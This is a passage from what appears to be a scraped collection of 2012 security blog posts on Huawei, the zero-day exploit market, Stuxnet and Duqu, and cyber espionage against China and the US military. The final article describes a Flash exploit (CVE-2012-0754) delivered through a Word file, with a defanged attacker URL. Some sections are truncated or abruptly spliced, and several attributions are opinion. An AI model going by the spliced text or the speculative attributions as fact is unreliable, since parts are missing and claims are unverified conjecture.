fight against cyber threat. The sources have not been declared because it was not authorized to speak. A business relationship with Huawei could have practical implications for the American company.\n\nHuawei (Officially Huawei Technologies Co. Ltd.) is a Chinese multinational networking and telecommunications equipment and services company. It is the second-largest supplier of mobile telecommunications infrastructure equipment in the world (after Ericsson).\n\nThe Chinese company has always been a disputed too close to the Chinese government policy and the Chinese People\u2019s Liberation Army. Do not forget that the government of Bejing has always been accused of meddling in the private choices of the national companies, we can imagine the interference in the circumstances. Many point to the company as under a full government control, pointing out that Ren Zhengfei, the founder of the company, served as an engineer in the Chinese People\u2019s Liberation Army in the early 1980s.\n\nThe Chinese company has received numerous allegations in the past, to name a few we think of its proximity to the government and the company has provided support in the implementation of systems of censorship. Also at Huawei has been questioned in the past have supported numerous operations of cyber espionage and cyber attacks such as the operation GhostNet.\n\nAccording to The New York Times report Huawei is leaving US due of increased American government oversight.\n\nThe news comes at a historic moment where the majority of Western states, while interested in working with Chinese companies, fearing the impact on their business from different points of view. China is accused of being responsible for the majority of attacks against foreign companies and agencies, and many experts believe that these attacks are directly sponsored by Beijing.\nHuawei is not the only company to be damaged by such a protectionist policy, the U.S. Government initiated an investigation in November to assess national security threats China\u2019s presence from the networking vendors in the country, including other companies such as ZTE.\nComplicating the situation are the same Chinese companies with the collaboration of governments considered hostile like Iran, the US Government has started an investigation on Chinese companies for supplying sensitive technology to Iran and violating international agreements. In 2011, United Against Nuclear Iran (UANI), an independent agency, requested to Huawei to its business with the Iranian Government. UANI alleges that Huawei provides Iranian regime surveillance systems for cellular and electronic technology to spy on its citizens, and track down human rights activists and dissidents.\n\nThe distrust of Chinese companies is high despite the desirable Asian market and this shows the overall awareness in the cyber threats and of the possible damage related. Huawei is still facing similar problems in telecom markets in India and Australia, in this last case the federal government has banned the company from participating in multibillion- dollar tenders to supply equipment to the broadband network.\n\nWhile I understand the defensive approach that I believe such behavior could have serious repercussions on the global market. Chinese companies are those that have the biggest capital at the time and close the door permanently is not the right approach. The real problem is the inability to cope with the threat to date opting for the escape.\nI think that in terms of security little will change by breaking these strategic alliances. The attacks will continue, will increase in frequency and efficiency, so the only way out is to prepare to face them.\nStop profitable relationships so I think it is a serious mistake.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Cyber espionage, Huawei \u2013 Symantec)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/censorship", "topic_name": "Censorship"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/content-filtering", "topic_name": "Content filtering"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/huawei", "topic_name": "Huawei"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/surveillance-systems", "topic_name": "surveillance systems"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/symantec", "topic_name": "Symantec"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "Reflections on the Zero-Days Exploits market starting from Forbes\u2019s article", "news_link": "https://securityaffairs.co/wordpress/3612/cyber-crime/reflections-on-the-zero-days-exploits-market-starting-from-forbess-article.html", "title": "Reflections on the Zero-Days Exploits market starting from Forbes\u2019s article\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 26, 2012", "body": "The news that I wish discuss was published on the website of Forbes magazine, titled \u201cShopping For Zero-Days: A Price List For Hackers\u2019 Secret Software Exploits\u201c,  that focuses on the commercial value of the vulnerability of popular applications. Time ago the figure of the hacker was recognized mainly as a researcher interested to measures its skills and capabilities against infrastructures and applications with the intent to find vulnerabilities to exploit, today much has changed in the approach to hacking matters. Of course there has long been a black market for Z-Day exploits, researchers and hackers for a long time were content to trade or sell exploits amongst themselves, mainly for prestige.\n\nToday the works of hackers are the subject of great interest, in fact the discovery of unknown vulnerability for a widespread application may be a business opportunity for the hacker itself and the manufacturer of the application compromised.\n\nThe hacker has a few more options than ever before, he could for example decide to contact the application producer to request a fee to avoid the vulnerability disclosure and its usage by cyber criminals and ill intentioned, but he may also choose to illustrate the vulnerability during a scientific meetings in order to increase his visibility being the object of attention of IT companies that have always interested in these precious minds. Recently, a trend has developed toward buying and selling these exploits as a source of  legitimate income for security researchers.\n\nA fundamental factor in this new market is the \u201cinstantaneity\u201d of any transactions involving vulnerability information, once found the vulnerability and exploited it the researcher must be able in a short time to identify the possible customer, contact it negotiating the price and completing the sale. There is concrete risk that the value of the good during the sale decay to zero due for example the divulgation of the Z-Day by third parts.\n\nBoth options although interesting are not the best choice economically. To be interested in the exploits are also governments around the world, just this type of client is the one that best compensates precious Zero Day Exploits.\n\nI invite you all to read the document that probably inspired the interesting article in Forbes, \u201cThe legitimate vulnerability market: the secretive world of 0-day exploit sales\u201d by Charles Miller, Ph.D., CISSP.\nTo better understand the complexity of the market and its transactions the document propose some reflections:\n\nDif\ufb01culty \ufb01nding buyers and sellers \u2013 We are facing with a closed market not openly accessible. Find a buyer or identify a possible sellers is a critical phase.\n\nChecking the buyer reliability \u2013 Due to the fact there is no centralized way to locate a buyer of vulnerability information, the researcher is often forced to try to tell many individuals about the discovery in an attempt to \ufb01nd a buyer.\n\nValue can not be demonstrated without loss \u2013 One of the more fascinating problems a researcher attempting to sell vulnerability information or a 0-day exploit may face is proving the validity of the information without disclosing the information itself. The only way to prove the validity of the information is \nto either reveal it or demonstrate it in some fashion. Obviously, revealing the information before the sale is undesirable as it leaves the researcher exposed to losing the intellectual property of the information without compensation.\n\nExclusivity of rights \u2013 The \ufb01nal hurdle involves the idea of exclusive rights of the information. In order to receive the largest payoffs, the researcher must be willing to sell all rights to the information to the buyer. However, the buyer has no way to protect themselves from the researcher selling the information to numerous parties, or even disclosing the information \npublicly, after the sale.\n\nBut how is the deal with governments?\n\nFor this kind of sales were born figures specializing in mediation, brokers for sales of Zero-Days exploits that provide anonymity to the bargaining parties retaining their commission.  The need for trusted third parties in the legitimate sale of vulnerabilities is crucial. Third parties provide a method for the seller to ensure they will be paid and that the exploit is intellectually protected and the buyer to ensure they are getting the information the seller claims to have. Trusted third parties play a crucial role in these sales.\n\nThe governments are really interested to this hacks because they could use it their cyber operations like cyber espionage or exploiting of target infrastructures.  The article proposed on Forbes reports a table with the price list for a list of hacking on major software products available on the market.\n\n\n\nAnalyzing the table we can discover that a vulnerability related Apple iOS could be paid 250K because it is difficult to discover. To affect the cost of vulnerability contributing factors such as:\n\nWhat are the main legal mediators in the IT field?\n\nThe Grugq is the famous one but also small firms like Vupen and Netragard and defense contractors like Northrop Grumman operate in the exploits. The market is extremely volatile and characterized by fast dynamics.\nSince the discovery of a vulnerability on the sale usually spend a few weeks. The nature of the information covered by the bargaining does not allow higher times.\n\nNetragard\u2019s founder Adriel Desautels says he\u2019s been in the exploit-selling game for a decade, and describes how the market has \u201cexploded\u201d in just the last year.  He says there are now \u201cmore buyers, deeper pockets,\u201d that the time for a purchase has accelerated from months to weeks, and he\u2019s being approached by sellers with around 12 to 14 zero-day exploits every month compared to just four to six a few years ago.\n\nThe proposed figures are certainly interesting, but still far from real gains achievable from the sale of valuable information to criminal organizations. Cybercrime is a growing phenomenon and the proceeds of which are extremely profitable, that why we can consider that it could pay the greatest rewards for the application exploits. Computer crime is organized like any efficient industry, and utilizing the latest technology is able to organize a parallel market able to attract large investments.  Think of an exploit that allows to obtain confidential information from governments or corporations. The sale of such information on the black market would no doubt bring in more money. However, an hacker is not a criminal and for it to approach this illegal world could really be dangerous, this one of the main reasons that might induce him to choose one of the ways described above.\n\nAt this point one might wonder whether behind this burgeoning market is observed ethical behavior. Many exploit could be used to attack a nation or preparing dangerous cyber weapons. The commercialization of this information should lead us to serious reflection on the position of all governments in the transactions mentioned. The precious information should not be accessible to everyone especially to the representatives of those countries always considered hostile. In this sector would be desirable a regulation, but the problem is far from simple. Introduce controls on the negotiation of such exploits could hijack sales to areas difficult to monitor with dangerous consequences.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-criminals", "topic_name": "cyber criminals"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-days-vulnerability", "topic_name": "Zero Days vulnerability"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-day-exploits", "topic_name": "Zero-Day Exploits"}]}, {"news_name": "US Experts say: Government Networks constantly hacked", "news_link": "https://securityaffairs.co/wordpress/3588/intelligence/us-experts-say-government-networks-constantly-hacked.html", "title": "US Experts say: Government Networks constantly hacked\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 25, 2012", "body": "For years, we have discussed the importance of appropriate cyber strategy and the necessity to preside over the main critical infrastructures to defend them from cyber threats of any kind and in our imagination we have always considered the US as a country at the forefront.\n\nWhile the cyber security experts analyze the progress made \u200b\u200bin countries like Russia and China and emerging realities like India and Iran, they alert us regarding the vulnerabilities of the main U.S. structures.\n\nThis time to worry U.S. security experts is the state of its computer networks that have been penetrated by foreign spies several times exposing sensible information. The success of the cyber attacks, according the declarations of the network experts, is due the US infrastructure status that are protected by obsolete defense systems unable to fight against continuos incursions.\n\nSpeaking before the Senate Armed Services Subcommittee on Emerging Threats and Capabilities the experts told the assembled Senators that the U.S. government needed to abandon the notion that it could keep outsiders off its computer networks.\n\nVery meaningful the worlds pronounced by Senator Rob Portman member of the Emerging Threats and Capabilities subcommittee:\n\n\u201cWe can do things to make it more costly for them to hack into our systems\u2026,\u201d\n\u201cbut you didn\u2019t say we can stop them.\u201d\n\nA clear message that expresses the awareness of the threat and impossibility to defeat it in the short term. The only feasible goal right now is trying to mitigate the threat reducing the intrusions, the experts report that US are under a massive attack that day fails to penetrate defenses raised to the protection of the infrastructures.\n\n\n\nWhat are the reasons of what can be considered a major failure in relation to huge government investment?\n\n\u201cThe production of computer scientists is on the decline,\u201d  \u201cWe are not recruiting and retaining them\u2026 I am concerned also that the investments from the Congress and the people is almost all period of performance of one year or less.

The money that comes to us has a very directed purpose\u2026 I feel the nation is frightened to think much beyond one or two years.\u201d\n\nThe global scenario is very worrying, every day we read of attacks through computer systems that could have serious repercussions at any moment. Do not forget that an attack on critical infrastructure could result in the loss of many lives, and it is a matter of time, but sooner or later this will happen. Statement as those that prompted me to write this article are disarming, demonstrate that the investments were completely wrong. Attribute the success of the attacks by foreign governments to the fact that US are using obsolete systems is reductive, behind the failures there are innumerable poor choices and the application of non-functional models. America is advanced on cyber context, and his statement should give everyone idea about the real state of security of many countries of the world.

The international scientific community has defined a Stuxnet deadly weapon because been designed with a detailed analysis of final target environment supported by a meticulous intelligence work that for the first time in history has embraced the world of information technology.\n\nThe agent was designed with the intent to strike the Iranian nuclear program and even more clear is who has always opposed such a program, U.S. and Israel first, and consider also the technology skill necessary to develope a weapon with the observed architecture is really high.\n\nExtremely important two factors af the event:\n\n\nRegarding the second point, it has been discovered a platform behind Stuxnet called \u201cTilded Platform\u201c, used also for the development of Duqu malware, and that make possible the development of a set of reusable tools, a true innovation that make possible the composition of ever new and enhanced agents with modules developed to fulfill specific functions against clearly defined targets.\n\n\n\n\nAs previously stated Duqu has some interesting features such as:\n\nAccording the ENISA Duqu Analysis there are important differences between Duqu and Stuxnet. The 2010 Kaspersky analysis [Gostev 2011] concluded that Stuxnet consists of the two parts:\n\nAccording to Kaspersky, the carrier platform of Stuxnet could be reused, for example with a different attack module. But, unlike Stuxnet, DuQu can also be reconfigured remotely to install new malware payloads and to direct attacks at new targets.\n\nThe attack module of DuQu, found together with the detected samples was a general purpose keylogger (enriched with some additional spying capabilities) able to perform a reconnaissance in any organization. However, according to Symantec, the aim of DuQu is to infiltrate organizations operating in industrial environments. This conclusion is based on the fact that the majority of the detected threats were found in industrial infrastructures, and because of the connection to Stuxnet code. Unlike Stuxnet, DuQu is an intelligence gathering tool, apparently aiming to prepare the ground for attacks such as Stuxnet. It should be emphasised, however that there is no direct evidence for the intentions behind DuQu\n\nBut if Duqu has no components to attack SCADA systems or similar, why create in us so much worry?\n\nRemember that we defined modular Duqu? Well this is the feature I think that should cause us to jump from the chair. To date we have isolated versions of malware orphan of those components to attack specific critical systems, but it is reasonable to assume that the same Duqu is a work in progress project. The ability to compose its structure at different times using modules designed specifically for precise goals, makes this unique and formidable.\n\nWhat occurred in the Stuxnet case has raised media attention demonstrating the total inadequacy of the defense systems of critical infrastructures across the world. Many, too many, the SCADA systems around the world, achievable in an easy manner and easily attacked by evil-minded because they are un protected, exposed on the web for maintenance purpose, and configured with the factory settings easily available even with simple searches on the web. Also for that SCADA systems deployed without security and isolated from the Internet there is a concrete risk to be infected using USB memory sticks.\n\nWhile in recent weeks, the Iranian government declared definitively defeat the threat Stuxnet in the last month there are many news published on the web related to malware Duqu.\n\nThe mistery of Duqu sorce code\n\nThe first one was related the identification of the mysterious language used in the DuQu virus. Researchers at Kaspersky Lab requested the help of international experts after failing to figure out the language on their own.\n\nThanks to help from programmers has been discovered that the language, which DuQu used to communicate with C&C (command & control) servers, is a special type of C code compiled with the Microsoft Visual Studio Compiler 2008.\n\nDespite the long period of study conducted on the agent the component of the source written in C remained a mystery. It\u2019s a vital part for Duqu used to communicate with C&C servers, download additional payload modules and execute them on infected machines.\n\nThe code was C code compiled with Microsoft Visual Studio Compiler 2008 using options 01 and Ob1 in the compiler to keep the code small optimizing execution time and size of the source code.\n\nThe use of object-oriented C dialect, generally called \u201cOO C, to write the event-driven code in the malware reveals that authors who coded this part of DuQu were probably old-school programmers, their style is uncommon for malware and is more commonly found in professionally-produced commercial software created ten years ago, according Costin Raiu, director of Kaspersky Lab\u2019s global research and analysis team.\n\nAnother important factor in choose of C language instead other more powerful like C++ it the necessity to grant portability of the agent that maybe must be compiled with several standard compiler in different environments. This requirement indicate us that the agent could be used to attack other platforms, not necessary Widows based.\n\n\u201cObviously when you create such a complex espionage tool, you take into account that maybe some day you will run it on servers, maybe you will want to run it on mobile phones or God knows what other devices, so you just want to make sure your code will work everywhere,\u201d Raiu says.\n\nThe Duqu evolution\n\nNews of these days is that a new variant of Duqu has been isolated, the event confirm the hypothesis made on the evolution of the malware, a work still in progress that will propose in the next year several instances customized to attacks specific targets.  The variant found was designed to evade detection mechanism of antivirus products and other security systems. Vikram Thakur, principal security response manager at Symantec, announced that the new Duqu Driver has been identified, let\u2019s remind that the module is used for loading the malware\u2019s encrypted body stored on the systems. The driver is called mcd9x86.sys and it was compiled on Feb. 23.\n\nWhat is changed in the new driver?\n\nThe source code appears to be reshuffled and compiled with a different set of options and it also contains a different subroutine for decrypting the configuration block and loading the malware\u2019s body. A similar operation has been already observed in October 2011. Of course also the references to C&C server are changed because all old structures were shut down on Oct. 20, 2011.\nUnfortunately the addresses of this server are not known because principal security firm don\u2019t have the full Duqu body but only the loader in the form of the driver, the loader does not contact the C&C directly, it only loads the main body which is stored in encrypted form.\n\nWhat we expect from the future?\n\nSurely we will confront with new and dangerous cyber threats that can offend the military and also private sector. Agents such as Stuxnet and Duqu are children of an ambitious and complex project that wants to be able to provide an \u201cevolutionary\u201d threat. Prepare to have to deal with new modules and new features designed to attack specific targets.\n\nLet me raise serious doubts on the immediate effectiveness of preventive measures against this new generation of cyber weapons because the industry in general is still too vulnerable. Possible evolutions of malware could cause serious damage to infrastructures that use the systems in question.\nThe only way to emerge unscathed from this awkward situation is a close collaboration between industry, leading manufacturers of control systems and governments, hoping that security will become a requirement in the design phase.\n\nPierluigi Paganini\n\nArticle Written for The Hacker News portal\n\nFace to Face with Duqu malware\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/keylogger", "topic_name": "keylogger"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sabotage", "topic_name": "Sabotage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tilded-platform", "topic_name": "Tilded Platform"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}]}, {"news_name": "China again victim of cyber attacks", "news_link": "https://securityaffairs.co/wordpress/3502/hacking/china-still-a-victim-of-cyber-attacks.html", "title": "China again victim of cyber attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 21, 2012", "body": "We have always been accustomed to reading incursions of Chinese cyber army into networks belonging to foreign private companies and government institutions. The Beijing government has been accused of pursuing a very aggressive cyber strategy responsible for serious damage to foreign companies. An emblematic case of Nortel, the company spied on for a decade by Chinese hackers ended up in bankruptcy.\n\nOf course the same country is victims it self of cyber attacks, many expert are in fact convinced that despite the aggressive cyber offense, Chinese cyber defense is not so efficient.\n\nOfficial report produced by China claims several attacks against public and private organizations coming from outside, the figures say of five million computers affected in 2010 and more of 8.9 million in 2011.\n\nThe information have been provided by the government\u2019s National Computer Network Emergency Response Technical Team and Coordination Center, that has revealed a worrying scenario, more than 10,593 Chinese websites during 2011 have been attacked by 11,851 IP addresses from overseas.\n\nThe series of attacks is broad and is not unlike that of China itself against attacks conducted by foreign governments, government web site defacing, cyber espionage, DDoS attacks.\n\nObjectives of the incursions of hackers are private companies and government agencies, and the reasons are mainly related to the desire to steal intellectual property relating to projects of a technological nature or the will to steal sensitive information related to government policy in Beijing.\n\nThe Chinese infrastructures, contrary to what one might think are extremely vulnerable to confirm this are the worlds said Wang Minghua, deputy director of the team\u2019s operation department:\n\n\u201cThis shows that Chinese websites still face a serious problem from being maliciously attacked by foreign hackers or IP addresses,\u201d\n\nUS defense contractor Northrop Grumman revealed that the People\u2019s Liberation Army is investing in the creation of advanced information warfare capabilities, and warned that security firms are helping to provide significant resources and knowledge.\n\nThe cyber space is the new battleground in which all governments have to grapple. Governments such as China, Russia, U.S., UK and Israel are undoubtedly at the forefront through investment in the sector, however, however the scennario is really unstable due the presence of actors like North Korea and Iran that can complicate the situation.\n\nWestern governments, primarily U.S. and UK, are investing heavily in developing new methods of attack and definition of cyber strategies to ensure the security of information infrastructures of these countries.\n\nBut who is responsible of this attacks?\n\nJapan is alleged to be the main source of cyber attacks against China, a quote of 22.8 per cent of total incursions, followed by the US with 20.4 per cent and then the Republic of Korea with 7.1 per cent.\n\n\n\nFrankly I find it very strange the data provided, especially for the presence of Korea tops the list presented and for the absence of Russia.  Until now I have analyzed data only from the political and cyber warfare point of view, however, we must consider other factors that contribute to the numbers presented, as the phenomenon of hacktivism and cybercrime.\n\nThe China is now the world\u2019s largest technology market, it is attractive to criminal organizations who see profitable business opportunities. Technological development and the rapid proliferation of electronics devices in the Asian country has caused a significant increase in damages related to cyber threats of various kinds.\n\nAnother factor to be reckoned with is the growing interest by hacktivist groups that condemn the repressive policies of the Chinese government\u2019s censorship. Groups like Anonymous in more than one occasion has expressed to will to attack the government in Beijing with sensational operations, such as OPChina.\n\nI believe that in the next future those attacks will increase and the damages caused could really harms social texture of China with unpredictable effects in financial and social fields.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/censorship", "topic_name": "Censorship"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos-attacks", "topic_name": "DDoS attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivist", "topic_name": "hacktivist"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident", "topic_name": "Incident"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/monitoring", "topic_name": "monitoring"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}]}, {"news_name": "Millions US government email addresses in the hands of the cybercrime", "news_link": "https://securityaffairs.co/wordpress/3439/cyber-crime/millions-of-u-s-government-and-military-email-addresses-available-in-the-hands-of-the-cyber-crime.html", "title": "Millions US government email addresses in the hands of the cybercrime\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 19, 2012", "body": "It has repeatedly reiterated the need for a cyber strategy to reduce risks related to cyber threats from various sources, military, cyber crime or hacktivism. Cyber \u200b\u200bthreats expose our intelligence agencies, our critical infrastructures and our companies to significant risks causing untold perfidious finance. In the area of \u200b\u200bcyber warfare governments have made considerable strides, gained awareness of the threat each nation is organizing a garrison of more or less vigilant cyber space.\n\nToo many people mistakenly believe that attacks on government institutions can only come from hacker groups sponsored by hostile governments, but do not forget that we live in an information age and information is money. Groups of cyber criminals are aware of the huge demand for information about military sectors, for this reason they continuously try to acquire and sell information about each country\u2019s militia and intelligence agencies through several techniques, espionage, phishing, extortions, cyber attacks, hacking of major government contractors.\n\n\n\nTo demonstrate how much interest there is on sensible information in military I report the presence on underground market of millions of harvested U.S government and U.S military harvested emails addresses that cyber criminals are trying to sell. The criminal business is offering  2.462.935 U.S government email addresses, and another 2.178.000 U.S military email addresses.\n\nThe risks are really serious, this information could be used by hostiles government in cyber attacks and cyber espionage activities in the short term.\n\nWe are facing with efficient organization that continuously collect info from various sources trying to sell them using several channels like social network, chat rooms, specific web sites and Internet directories. Many organizzation have set up growing community where they sold any kind of service, from the malware development to information need to attack a specific target. Specific social network offer advice for the development of new modules to use in conjunction with well known malware (e.g. Zeus, SpyEye). This open communities are really dangerous and hard to monitor, we must consider them malware factories.\n\nCyber criminals have used several cyber options to gather personal data and financial information of representatives of the U.S. military. The scams schemes provide phishing attacks and malware diffusion to steal precious data.  Really interesting another aspect, spammers and virus creators are also launching massive attacks on anti-spam organizations with the intent to thwart their defense and operate unchallenged.\n\nThe knowledge of this email addressed could be used in targeted cyber attacks with the purpose to gain access to critical information related to military operation in which the victim is involved.\n\nU.S government and U.S military users whose emails have been exposed have been alerted on the risks, they have been informed that they could be targeted by malware attacks, they are all invited to avoid downloading and executing a malicious attachment, or clicking on link found in the suspicious emails.\n\nThe news of the availability of large amount of email on the black market came meanwhile U.S. military declare their strong engage in to fight against cyber threats with a very offensive strategy. The Pentagon has just sent a report to Congress where it says that it has the right to retaliate with military force against a cyber attack.\n\nAir Force General Robert Kehler said\n\n\u201cI do not believe that we need new explicit authorities to conduct offensive operations of any kind\u201d,\n\nit\u2019s clear the approach to the new emergency.\n\nUS security agencies are also training team of cyber forensics experts and group of hackers to identify, prevent and fight and cyber threats.

I refuse to call cyber criminals, a group of expert hackers who made himself the protagonist of a complex story from different points of view. The group has tapped the tension around the Iranian nuclear program to spread a malware and the interesting idea is that the final target of the agent are the US military staff.\n\nThe malware use a consolidated technique, browser exploitation spread through a Word (.doc) document sent with spam mail. The subject is \u201cIran\u2019s Oil and Nuclear Situation.doc\u201d, and seeks to leverage the user\u2019s curiosity. Application exploitation is among the most effective because it request great effort to be identified and can be realized using several exploit packs simply available.\n\nThe document contains a Shockwave Flash applet that tries to load a video file (.mp4) from hxxp://208.1xx.23x.76/test.mp4. This MP4 file isn\u2019t your regular YouTube video. It has been crafted to include a valid header so it can legitimately identify itself as MP4, but the rest of the file is filled with 0x0C values. When the file loads and the Flash Player tries to render the MP4, it triggers an exploit in the Adobe Flash plugin (CVE-2012-0754), that ultimately drops an executable file embedded in the initial .doc.\n\n\n\nVery interesting is the silent mode is used to trigger the exploit and the multiple levels of obfuscation used to hide the agent inside the doc file (us.exe) to the virus. Once infected the victims a backdoor (identified by Bitdefender as Gen:Variant.Graftor.15447) waiting for master\u2019s request.\n\nWho has developed the malware?\nAgain seems to be that responsible come from China because the malicious code tries to connect to a C&C server that uses dynamic DNS services to permanently change its IP address. The fact the master is located a in China and that the malware hasn\u2019t spread with massive spam campaign but limited to a specific region suggest to the expert the real target maybe the US military staff involved in Iranian military operations. The fact the the master is located a in China and that the malware hasn\u2019t spread with massive spam campaign but limited to a specific region suggest to the expert the real target maybe the US military staff involved in Iranian military operations.\n\nTo reinforce the doubts about China\u2019s cyber army are in my opinion two observations, the first is that considering the strict control of web exercised by China can be difficult for an 